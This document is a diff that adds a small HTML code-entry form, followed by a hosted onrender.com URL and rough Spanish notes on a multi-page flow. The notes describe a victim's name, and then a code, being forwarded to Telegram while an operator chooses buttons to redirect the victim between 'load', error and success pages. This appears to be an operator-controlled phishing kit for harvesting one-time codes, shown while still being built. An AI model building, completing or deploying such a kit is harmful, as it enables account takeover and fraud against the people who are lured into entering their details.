@@ -1,0 +1,82 @@
+<h2>Ingrese su código</h2>
+<input id="code" placeholder="Código">
+<button onclick="enviar()">Enviar</button>
+
+<script>
+function enviar(){
+  const params = new URLSearchParams(location.search);
+  const id = params.get("id");
+  const code = document.getElementById("code").value;
+  location.href = `/validando.html?id=${id}&code=${code}`;
+}
+</script>
+
+
+
+https://bogotacol.onrender.com/codigo.html?id=b06a2726-3342-4ef4-8716-10c94684bd52
+
+
+ingrese  nombre 
+cargue load  
+botones en telegram 
+ok  error   codigo
+si se elije codigo redirecciona  
+codigo.html 
+si se elje error  redirecciona 
+index.html
+cuando esta  la url en codigo.html
+aparezcab botones botones  en telegram
+codok / coderror 
+si se elije codok  redirecciona  ok.html 
+si se elije coderror redirecciona coderr.html
+
+
+recibe el nombre  index.html
+envia nombre a telegram
+luego  ok  carga 
+codigo.html 
+se envia  y salen tres botones  
+
+
+
+en el ciclo cuando 
+envia nombre  si envia el nombre
+carga los botones en telegram 
+da codigo y sale codigo.html
+pero no envia  
+nom 1111
+codi111 
+misma id  si  que la cambia 
+
+
+
+
+usuario escribe nombre
+→ load.html
+
+Telegram:
+
+carga  el index.html  se envia nombre 
+carga LOAD.html hasta que se decida la peticion 
+y envia a telegram 
+nom 1111
+aprezca dos botones 
+ERROR → index.html
+CODIGO → codigo.html
+-----------------
+si elije CODIGO 
+carga  el codigo.html  cuando el usuario  llene el campo
+se carga el LOAD.html esperando la peticion 
+envia a telegram    
+nombre 1111
+codigo 12345
+y aparezcan dos botones 
+codok → ok.html
+coderror → coderr.html
+
+si da ok.html redirecciona  google.com/codigo 
+si escoje  coderrrr cargar  coderror.html 
+
+
+
+ 
